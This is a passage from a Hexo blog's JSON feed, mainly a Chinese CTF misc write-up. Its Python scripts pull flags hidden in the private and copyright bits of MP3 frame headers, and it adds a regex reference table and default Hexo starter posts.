之间发生改变，进而影响了单独 mf 数组的大小。因此，这两位在整个 mf 数组中连续拼接可能藏有 flag 或者重要的信息，优先提取。</p>\n</blockquote>\n<h2 id=\"0x03-解析脚本\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解析脚本\">#</a> 0x03 解析脚本</h2>\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\">   <span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">   n = <span class=\"number\">0x399D0</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">   target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;1.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\">   <span class=\"comment\"># 提取</span></span><br><span class=\"line\">   <span class=\"keyword\">while</span> n &lt; <span class=\"number\">0x294C6A</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">       file.seek(n, <span class=\"number\">0</span>) <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">       byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\">#往后读取一个字节（8位）</span></span><br><span class=\"line\">       padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>] <span class=\"comment\">#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字</span></span><br><span class=\"line\">       target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">1</span>] <span class=\"comment\">#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A2</span></span><br><span class=\"line\">       <span class=\"keyword\">else</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A1</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">#textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">   textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit) <span class=\"comment\">#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">       flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)     <span class=\"comment\">#int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"comment\">#print(flag) #发现后面有很多未知空字符，删也删不掉</span></span><br><span class=\"line\">   flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag) <span class=\"comment\">#用正则匹配标准flag</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p 0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!=\"\">flag</p>\n<p><img src=\"image-20220917134916608.png\" alt=\"image-20220917134916608\"></p>\n<h2 id=\"0x04-常用正则补充\"><a class=\"markdownIt-Anchor\" href=\"#0x04-常用正则补充\">#</a> 0x04 常用正则 (补充)</h2>\n<p>①<strong>显示不可打印的字符</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\a</td>\n<td>报警</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>退格</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>换页</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>换行</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>回车</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>字表符</td>\n</tr>\n</tbody>\n</table>\n<p>②<strong>指定预定义的字符集</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\d</td>\n<td>任意一个十进制数字 [0-9]</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>任意一个非十进制数字</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>任意一个空白字符 (空格、换行符、换页符、回车符、字表符)</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>任意一个非空白字符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>任意一个单词字符</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>任意个非单词字符</td>\n</tr>\n</tbody>\n</table>\n<p>③<strong>限定符 (？*+{n，m}.)</strong><br>\n 限定符主要是用来限定每个字符串出现的次数。</p>\n<table>\n<thead>\n<tr>\n<th>限定字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>？</td>\n<td>零次或一次</td>\n</tr>\n<tr>\n<td>*</td>\n<td>零次或多次</td>\n</tr>\n<tr>\n<td>+</td>\n<td>一次或多次</td>\n</tr>\n<tr>\n<td n=\"\"></td>\n<td>n 次</td>\n</tr>\n<tr>\n<td n,=\"\"></td>\n<td>至少 n 次</td>\n</tr>\n<tr>\n<td n,m=\"\"></td>\n<td>n 到 m 次</td>\n</tr>\n<tr>\n<td>.</td>\n<td>匹配任意一个字符（不包含换行符）</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"0x05-再来一道\"><a class=\"markdownIt-Anchor\" href=\"#0x05-再来一道\">#</a> 0x05 再来一道</h2>\n<p>翻看了几帧发现 <code>private_bit</code>  位都是 0，似乎并没有存储数据。但是在翻看的时候发现，<ins> <code>uint32 copyright</code>  这一位似乎内藏玄机</ins>，这一位在相邻几帧的数据有 0 有 1，查询得知这是版权位，通常不会出现不同帧有 0 有 1 的情况。</p>\n<p>于是决定将 <code>copyright</code>  位的数据提取出来看看。</p>\n<p><img src=\"image-20220917134512128.png\" alt=\"image-20220917134512128\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">0xF05A4</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;2.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>)  <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\"><span class=\"comment\"># 提取</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">0xC12623</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">    file.seek(n, <span class=\"number\">0</span>)  <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\"># 往后读取一个字节（8位）</span></span><br><span class=\"line\">    padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>]  <span class=\"comment\"># 从中提取倒数第2个bit 也就是padding的值</span></span><br><span class=\"line\">    file.seek(n + <span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">    target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">4</span>]  <span class=\"comment\"># 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x415</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x414</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit)  <span class=\"comment\"># 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)  <span class=\"comment\"># int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p b3d7bed5-e8da-4d9c-848c-e5d332d63bcd=\"\">flag</p>\n<p><img src=\"image-20220917134626086.png\" alt=\"image-20220917134626086\"></p>\n",
            "tags": [
                "CTF小训",
                "Misc"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "url": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "title": "测试文章",
            "date_published": "2022-07-13T19:13:28.000Z",
            "content_html": "<p>这是一篇测试文章</p>\n<img src=\"/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png\" class=\"\" title=\"图片引用方法一\">\n<p><img src=\"test.png\" alt=\"图片引用方法二\"></p>\n",
            "tags": [
                "原创"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "url": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "title": "Hello World",
            "date_published": "2022-07-13T15:20:21.111Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}